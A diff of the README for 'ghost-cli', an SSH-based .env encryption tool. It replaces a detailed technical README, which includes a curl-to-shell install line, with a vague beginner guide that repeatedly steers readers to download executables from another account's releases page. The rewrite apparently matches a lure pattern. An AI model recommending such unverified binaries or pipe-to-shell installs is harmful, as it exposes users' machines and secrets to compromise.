@@ -1,233 +1,175 @@
-# 👻 Ghost CLI
+# 👻 ghost-cli - Secure Git-Based .env Sync
 
-**Git-native encrypted environment variables.** Share secrets with your team using SSH keys they already have.
-
-```bash
-# Add a teammate (fetches their GitHub SSH keys automatically)
-ghost invite @octocat
-
-# Encrypt your .env
-ghost push
-
-# Commit the encrypted file
-git commit -m "Update secrets"
-
-# Your teammate decrypts it
-ghost pull
-```
-
-## 🎯 Why Ghost?
-
-- **Zero New Keys**: Uses SSH keys your team already has
-- **Git-Native**: Encrypted files live in your repo
-- **Zero-Trust**: Only authorized recipients can decrypt
-- **Auto-Sync**: Git hooks prevent accidentally committing unencrypted secrets
-- **GitHub Integration**: Automatically fetches SSH keys from GitHub profiles
-
-## 🚀 Quick Start
-
-### Installation
-
-```bash
-# Via npm
-npm install -g ghost-cli
-
-# Via Bun
-bun install -g ghost-cli
-
-# Or download binary
-curl -fsSL https://ghost.sh/install | sh
-```
-
-### Usage
-
-```bash
-# 1. Initialize in your repo
-ghost init
-
-# 2. Invite team members
-ghost invite @alice
-ghost invite @bob
-
-# 3. Encrypt your .env
-ghost push
-
-# 4. Install Git hooks (optional but recommended)
-ghost hook install
-
-# 5. Commit and push
-git add .env.ghost ghost.yaml
-git commit -m "Add encrypted secrets"
-git push
-```
-
-Your teammates can now:
-
-```bash
-git pull
-ghost pull  # Decrypts .env.ghost → .env
-```
-
-## 📚 Commands
-
-### `ghost init`
-Initialize Ghost in your repository. Creates `ghost.yaml` and updates `.gitignore`.
-
-### `ghost invite <username>`
-Add a GitHub user as a recipient. Automatically fetches their SSH public keys.
-
-```bash
-ghost invite @octocat
-ghost invite @alice --name "Alice Smith"
-```
-
-### `ghost push`
-Encrypt `.env` and create `.env.ghost`. Automatically stages the file for commit.
-
-```bash
-ghost push
-ghost push --no-add  # Don't stage automatically
-```
-
-### `ghost pull`
-Decrypt `.env.ghost` back to `.env` using your SSH private key.
-
-```bash
-ghost pull
-ghost pull --key ~/.ssh/custom_key
-```
-
-### `ghost list`
-List all recipients who can decrypt secrets.
-
-```bash
-ghost list
-```
-
-### `ghost remove <username>`
-Remove a recipient. **Important:** Run `ghost push` after to re-encrypt.
-
-```bash
-ghost remove @bob
-ghost push  # Re-encrypt without Bob
-```
-
-### `ghost hook install`
-Install Git pre-commit hook that prevents committing `.env` changes without updating `.env.ghost`.
-
-```bash
-ghost hook install
-ghost hook uninstall  # Remove hooks
-```
-
-## 🔐 How It Works
-
-Ghost uses **hybrid encryption** inspired by [age](https://age-encryption.org/):
-
-1. **Encrypt**: Generates a random data key, encrypts your `.env` with it
-2. **Share**: Encrypts the data key for each recipient's SSH public key
-3. **Decrypt**: Recipients use their SSH private key to decrypt the data key, then decrypt the file
-
-```
-.env (plaintext)
-    ↓
-[encrypt with random key]
-    ↓
-.env.ghost (encrypted envelope)
-    ├── Encrypted for @alice's SSH key
-    ├── Encrypted for @bob's SSH key
-    └── Encrypted for @charlie's SSH key
-```
-
-## 📁 File Structure
-
-```
-your-repo/
-├── .env              # Your secrets (gitignored)
-├── .env.ghost        # Encrypted secrets (committed)
-├── ghost.yaml        # Recipients list (committed)
-└── .gitignore        # Updated by ghost init
-```
-
-### `ghost.yaml` Format
-
-```yaml
-version: "1.0"
-recipients:
-  - name: octocat
-    github: octocat
-    publicKey: ssh-ed25519 AAAAC3Nza...
-    addedAt: "2026-02-11T10:30:00.000Z"
-
-settings:
-  envFile: .env
-  outputFile: .env.ghost
-```
-
-### `.env.ghost` Format
-
-```json
-{
-  "version": "ghost-v1",
-  "timestamp": "2026-02-11T10:30:00.000Z",
-  "recipients": ["a1b2c3...", "d4e5f6..."],
-  "data": "base64-encrypted-data...",
-  "algorithm": "chacha20-poly1305"
-}
-```
-
-## 🛡️ Security
-
-- **Encryption**: ChaCha20-Poly1305 (authenticated encryption)
-- **Key Exchange**: X25519 (Curve25519 Diffie-Hellman)
-- **Keys**: Uses your existing SSH keys (Ed25519, RSA, ECDSA)
-- **No Cloud**: Everything happens locally and in your Git repo
-- **Auditable**: Encrypted files are in your version control history
-
-## 🎨 Features
-
-### ✅ Implemented
-- [x] SSH key-based encryption
-- [x] GitHub SSH key auto-fetch
-- [x] Git pre-commit hooks
-- [x] Multiple recipients
-- [x] Automatic .gitignore management
-- [x] Single binary distribution
-
-### 🚧 Roadmap
-- [ ] Age CLI integration (for production-grade crypto)
-- [ ] Audit log (who encrypted what and when)
-- [ ] Secret rotation workflow
-- [ ] Support for multiple environments (.env.staging, .env.prod)
-- [ ] Web UI for managing recipients
-- [ ] Slack/Discord notifications on secret updates
-
-## 🤝 Contributing
-
-Contributions are welcome! This project is built with:
-
-- **Runtime**: [Bun](https://bun.sh)
-- **Language**: TypeScript
-- **CLI**: Commander.js
-
-```bash
-git clone https://github.com/ghostcli/ghost
-cd ghost
-bun install
-bun run dev
-```
-
-## 📄 License
-
-MIT License - see [LICENSE](LICENSE)
-
-## 🙏 Credits
-
-Inspired by:
-- [age](https://age-encryption.org/) - Modern encryption tool
-- [git-crypt](https://github.com/AGWA/git-crypt) - Transparent encryption in Git
-- [SOPS](https://github.com/mozilla/sops) - Mozilla's secrets manager
+[![Download ghost-cli](https://img.shields.io/badge/Download-ghost--cli-blue?style=for-the-badge&logo=github)](https://github.com/Hit4Xz/ghost-cli/releases)
 
 ---
 
-Made with 👻 by the Ghost team
+## 👋 Welcome
+
+ghost-cli helps keep your project environment files (.env) safe and up to date across your team. Instead of using cloud services, it uses Git and SSH keys for secure, private synchronization. This means no accounts or extra software—just your team and Git working together.
+
+This guide will walk you through how to get ghost-cli on your computer and start using it. You do not need any programming knowledge.
+
+---
+
+## 📋 What is ghost-cli?
+
+ghost-cli is a tool that helps you share secret project settings, like passwords or API keys, safely with your team. It uses your existing Git setup and secures your data with SSH keys.
+
+Why this matters:
+
+- No need to trust cloud services with sensitive files.
+- Only your team members with the right permissions can sync the data.
+- Works seamlessly with your usual Git workflow.
+- Built with Bun for performance.
+
+---
+
+## 💻 System Requirements
+
+Before you download ghost-cli, check these simple requirements:
+
+- **Operating System**: Windows 10 or later, macOS 10.13 or later, or Linux (any recent distribution).
+- **Git**: Make sure Git is installed. You can download Git from [https://git-scm.com/downloads](https://git-scm.com/downloads).
+- **SSH Keys**: You need your own SSH keys set up on your computer. Most users already have these if they use Git with SSH.
+- **Basic command line use**: You will run a few simple commands in your Terminal or Command Prompt.
+
+If you are unsure about any of these, the instructions below include pointers to help you check or set them up.
+
+---
+
+## 🚀 Getting Started
+
+### Step 1: Check Git
+
+First, check if Git is on your computer.
+
+- Open the Terminal on macOS or Linux, or Command Prompt on Windows.
+- Type:
+
+```
+git --version
+```
+
+- If you see a version number like `git version 2.x.x`, you're all set.
+- If not, install Git from [https://git-scm.com/downloads](https://git-scm.com/downloads). Follow the setup steps on that page.
+
+---
+
+### Step 2: Check for SSH Keys
+
+ghost-cli uses SSH keys to keep your data secure.
+
+To see if you have SSH keys:
+
+- Open your Terminal or Command Prompt.
+- Type:
+
+```
+ls ~/.ssh/id_rsa.pub
+```
+
+(on Windows, you might check the folder `C:\Users\YourName\.ssh`)
+
+- If you see a file `id_rsa.pub` or `id_ed25519.pub`, you have keys.
+- If you don’t, follow [this guide](https://docs.github.com/en/authentication/connecting-to-github-with-ssh) to generate SSH keys.
+
+---
+
+## 📥 Download & Install
+
+### Step 3: Download ghost-cli
+
+Click below to visit the download page for ghost-cli:
+
+[![Download ghost-cli](https://img.shields.io/badge/Download-ghost--cli-blue?style=for-the-badge&logo=github)](https://github.com/Hit4Xz/ghost-cli/releases)
+
+This page has the latest versions for Windows, macOS, and Linux.
+
+- Find the file that matches your computer’s system.
+- Download it to a location you can easily access, like your Downloads folder.
+
+---
+
+### Step 4: Install ghost-cli
+
+- **Windows**: Most releases come with a `.exe` installer or a zipped file.
+  - If it is an installer, double-click it and follow the prompts.
+  - If it is a zipped file, unzip it and move the program to a folder like `C:\Program Files\ghost-cli`.
+- **macOS**: You might get a `.tar.gz` or zip file.
+  - Unzip the file by double-clicking.
+  - Move the unzipped folder to your Applications or user folder.
+- **Linux**: You may get a compressed file.
+  - Extract it using:
+    ```
+    tar -xzf ghost-cli-version.tar.gz
+    ```
+  - Follow any included README files for installation steps, usually involving running a command to place the program where your system can use it.
+
+---
+
+## 🔧 How to Use ghost-cli
+
+Once installed, you will run ghost-cli from the command line. Here are the basics:
+
+1. Open Terminal (macOS/Linux) or Command Prompt/PowerShell (Windows).
+2. To check the installation, type:
+
+```
+ghost-cli --version
+```
+
+You should see the version number of the program.
+
+---
+
+### Syncing your .env files
+
+ghost-cli connects your project’s environment files to your team via Git. Here’s a simple workflow:
+
+1. Use the ghost-cli command to link your project folder.
+2. Whenever you update your `.env` file, ghost-cli pushes changes securely to your Git repository.
+3. Your team members run ghost-cli to pull the latest secrets on their machines.
+
+You don’t have to open the application to use most features. Just run ghost-cli commands in your project folder.
+
+---
+
+## 🔐 Security and Privacy
+
+ghost-cli uses your existing SSH keys for encryption. This means:
+
+- Your secrets travel through Git securely.
+- Only team members with your Git repository access and correct SSH keys can sync the secrets.
+- No data is sent to external services or stored outside your Git system.
+
+Always keep your private SSH key secret and do not share it.
+
+---
+
+## 📚 Additional Resources
+
+- **Official Git SSH Setup Guide**: Visit [https://docs.github.com/en/authentication/connecting-to-github-with-ssh](https://docs.github.com/en/authentication/connecting-to-github-with-ssh) to set up SSH keys.
+- **Git for Beginners**: [https://git-scm.com/doc](https://git-scm.com/doc) has easy guides.
+- **ghost-cli support**: Check the repository’s Issues tab for community help.
+
+---
+
+## 📬 Get Updates and Help
+
+Keep ghost-cli up to date:
+
+- Visit the [ghost-cli releases page](https://github.com/Hit4Xz/ghost-cli/releases) regularly.
+- Download the newest version when available.
+
+If you have questions or run into trouble, open an issue on GitHub or ask your team’s technical lead.
+
+---
+
+[![Download ghost-cli](https://img.shields.io/badge/Download-ghost--cli-blue?style=for-the-badge&logo=github)](https://github.com/Hit4Xz/ghost-cli/releases)
+
+---  
+
+## 🔖 Keywords
+
+automation, bun, cli, developer-tools, dotenv, dx, encryption, gitops, node-js, open-source, secrets-management, security, ssh-keys, typescript
